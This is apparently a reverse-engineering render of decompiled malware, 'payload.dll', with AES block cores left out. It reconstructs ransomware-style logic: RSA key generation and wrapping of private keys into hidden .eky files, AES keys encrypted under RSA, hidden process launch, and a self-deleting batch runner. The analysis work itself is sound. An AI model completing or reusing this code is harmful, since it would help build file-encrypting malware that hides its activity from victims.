// ============================================================================
// payload.dll - Batch 5: RSA/CryptoAPI key mgmt, AES-CBC engine, cmd exec
// ----------------------------------------------------------------------------
// ANALYSIS ARTIFACT - readability render. Not buildable: the AES block cores
// (sub_10006730 / sub_10006AF0) are described, not implemented.
// ============================================================================

#include <windows.h>
#include <stdio.h>

// Crypto object layout (vtable off_1000827C), 32-bit:
//   +4  HCRYPTPROV hProv
//   +8  HCRYPTKEY  hKey1  (per-file RSA, used to wrap AES keys)
//   +12 HCRYPTKEY  hKey2  (embedded/public key)
//   +16 CRITICAL_SECTION

// ============================================================================
// sub_10003CB0 - CryptAcquireContext (PROV_RSA_AES)
// ============================================================================
BOOL __thiscall sub_10003CB0(HCRYPTPROV *this)
{
    for (int v1 = 0; v1 < 2; ++v1) {
        if (CryptAcquireContextA(this + 1, NULL,
                                 v1 != 0 ? MS_ENHANCED_PROV_A : NULL,
                                 PROV_RSA_AES, 0xF0000000))
            return 1;
        if (v1 >= 1)
            return 0;
    }
    return 1;
}

// ============================================================================
// sub_10003E30 - load/import RSA key from file
// ============================================================================
int __thiscall sub_10003E30(HCRYPTPROV *this, LPCSTR lpFileName)
{
    if (*(this + 2)) {
        CryptDestroyKey(*(this + 2));
        *(this + 2) = 0;
    }
    return sub_10004130(*(this + 1), this + 2, lpFileName);
}

// ============================================================================
// sub_10004130 - ReadFile + CryptImportKey
// ============================================================================
int __cdecl sub_10004130(HCRYPTPROV hProv, HCRYPTKEY *phKey, LPCSTR lpFileName)
{
    HANDLE FileA = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (FileA == INVALID_HANDLE_VALUE)
        return 0;

    DWORD v6 = GetFileSize(FileA, 0);
    if (v6 <= 0x19000) {
        BYTE *v8 = GlobalAlloc(0, v6);
        DWORD n;
        if (v8 && ReadFile(FileA, v8, v6, &n, NULL) && CryptImportKey(hProv, v8, n, 0, 0, phKey))
            return 1;
    }
    return 0;
}

// ============================================================================
// sub_10004570 - CryptGenKey AT_KEYEXCHANGE, 2048-bit exportable
// ============================================================================
BOOL __cdecl sub_10004570(HCRYPTPROV hProv, HCRYPTKEY *phKey)
{
    return CryptGenKey(hProv, AT_KEYEXCHANGE, 0x08000001 /*2048|CRYPT_EXPORTABLE*/, phKey);
}

// ============================================================================
// sub_10004270 - export RSA key to file
// ============================================================================
int __cdecl sub_10004270(int a1, HCRYPTKEY hKey, DWORD dwBlobType, LPCSTR lpFileName)
{
    DWORD pdwDataLen = 0;
    CryptExportKey(hKey, 0, dwBlobType, 0, NULL, &pdwDataLen);

    BYTE *v5 = GlobalAlloc(0, pdwDataLen);
    CryptExportKey(hKey, 0, dwBlobType, 0, v5, &pdwDataLen);

    HANDLE FileA = CreateFileA(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN, NULL);
    DWORD n;
    WriteFile(FileA, v5, pdwDataLen, &n, NULL);
    return 1;
}

// ============================================================================
// sub_10004590 - generate random AES key, RSA-encrypt it
// ============================================================================
BOOL __thiscall sub_10004590(int this, BYTE *pbBuffer, DWORD pdwDataLen,
                             BYTE *pbData, DWORD *a5)
{
    if (*(HCRYPTKEY *)(this + 8) == 0)
        return 0;
    if (!sub_10004640((HCRYPTPROV *)this, pbBuffer, pdwDataLen))
        return 0;

    if (pbData && a5) {
        memcpy(pbData, pbBuffer, pdwDataLen);
        EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
        BOOL ok = CryptEncrypt(*(HCRYPTKEY *)(this + 8), 0, TRUE, 0, pbData, &pdwDataLen, *a5);
        LeaveCriticalSection((LPCRITICAL_SECTION)(this + 16));
        if (!ok)
            return 0;
        *a5 = pdwDataLen;
    }
    return 1;
}

// ============================================================================
// sub_10003E70 - export RSA private key, wrapped, as .eky
//   .eky format: [DWORD encLen][encBlob...] via sub_100043A0 (manual chunking)
// ============================================================================
void *__thiscall sub_10003E70(int this, LPCSTR lpFileName)
{
    if (!lpFileName)
        return 0;

    DWORD Buffer = 0;
    BYTE *v3 = sub_100043A0(*(HCRYPTKEY *)(this + 4), *(HCRYPTKEY *)(this + 8),
                            *(HCRYPTKEY *)(this + 12), 7 /*PRIVATEKEYBLOB*/, &Buffer);
    if (v3) {
        HANDLE v5 = CreateFileA(lpFileName, GENERIC_WRITE, FILE_SHARE_READ,
                                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (v5 != INVALID_HANDLE_VALUE) {
            DWORD n;
            SetFilePointer(v5, 0, NULL, FILE_END);
            WriteFile(v5, &Buffer, 4, &n, NULL);
            WriteFile(v5, v3, Buffer, &n, NULL);
        }
        GlobalFree(v3);
        return (void *)(n == Buffer);
    }
    return 0;
}

// ============================================================================
// sub_100043A0 - manual RSA export + chunk-encrypt
// ----------------------------------------------------------------------------
// Export key blob, read modulus size via CryptGetKeyParam(KP_KEYLEN), split into
// (modulus-11)-byte chunks, CryptEncrypt each with the embedded public key, and
// concatenate. Used to wrap the .eky private key.
// ============================================================================
BYTE *__cdecl sub_100043A0(int a1, HCRYPTKEY hKey, HCRYPTKEY a3,
                           DWORD dwBlobType, DWORD *pdwDataLen)
{
    /* chunked-export implementation omitted (analysis) */
    return NULL;
}

// ============================================================================
// sub_10003F40 - validate .dky/.pky keypair by encrypt/decrypt round-trip
// ============================================================================
int __thiscall sub_10003F40(HCRYPTPROV *this, LPCSTR lpFileName, LPCSTR a3)
{
    static const char Str2[] = "TESTDATA";
    BYTE pbData[0x200];
    DWORD len = 0x200;

    if (!sub_10003CB0(this))
        return 0;

    if (sub_10004130(*(this + 1), this + 2, lpFileName) == 0 ||
        sub_10004130(*(this + 1), this + 3, a3) == 0) {
        sub_10003DE0(this);
        return 0;
    }

    memcpy(pbData, Str2, sizeof(Str2));
    if (!CryptEncrypt(*(this + 2), 0, TRUE, 0, pbData, &len, 0x200) ||
        !CryptDecrypt(*(this + 3), 0, TRUE, 0, pbData, &len)) {
        sub_10003DE0(this);
        return 0;
    }
    if (strncmp((char *)pbData, Str2, strlen(Str2)) != 0) {
        sub_10003DE0(this);
        return 0;
    }
    return 1;
}

// ============================================================================
// AES (Rijndael) key schedule + block cores
// ----------------------------------------------------------------------------
// sub_10006270  key schedule: supports 128/192/256-bit key & block.
//               S-box byte_10008AAC, Rcon unk_1000BCAC.
//               enc round keys @ +8, dec round keys @ +488, IV @ +1008,
//               original IV @ +976, keylen @ 968, blocksize @ 972, rounds @ 1040.
// sub_10006AF0  block encrypt; 16-byte fast path -> sub_10006730
// sub_10006730  AES-128 block encrypt (10 rounds, T-tables, S-box final round)
// sub_10006DF0  mode driver:
//                 a5 == 1 : CBC encrypt (XOR pt with IV/cipher, encrypt, IV=cipher)
//                 a5 == 2 : CFB encrypt
//                 else    : ECB encrypt
// ============================================================================

// ============================================================================
// sub_10001000 - CreateProcess hidden, optional wait
// ============================================================================
int __cdecl sub_10001000(LPSTR lpCommandLine, int a2, LPDWORD lpExitCode)
{
    STARTUPINFOA StartupInfo = {0};
    PROCESS_INFORMATION pi;
    StartupInfo.cb = sizeof(StartupInfo);
    StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, lpCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, NULL, &StartupInfo, &pi))
        return 0;

    if (a2) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        if (lpExitCode)
            GetExitCodeProcess(pi.hProcess, lpExitCode);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

// ============================================================================
// sub_100010B0 - write + run temp .bat
// ============================================================================
FILE *__cdecl sub_100010B0(const char *a1)
{
    char Buffer[64];
    srand(GetTickCount());
    sprintf(Buffer, "%d%d.bat", rand(), (int)time(NULL));

    FILE *v4 = fopen(Buffer, "w");
    if (v4) {
        fprintf(v4, "%s\ndel /a %%0\n", a1);
        fclose(v4);
        return (FILE *)sub_10001000(Buffer, 1, NULL);
    }
    return NULL;
}
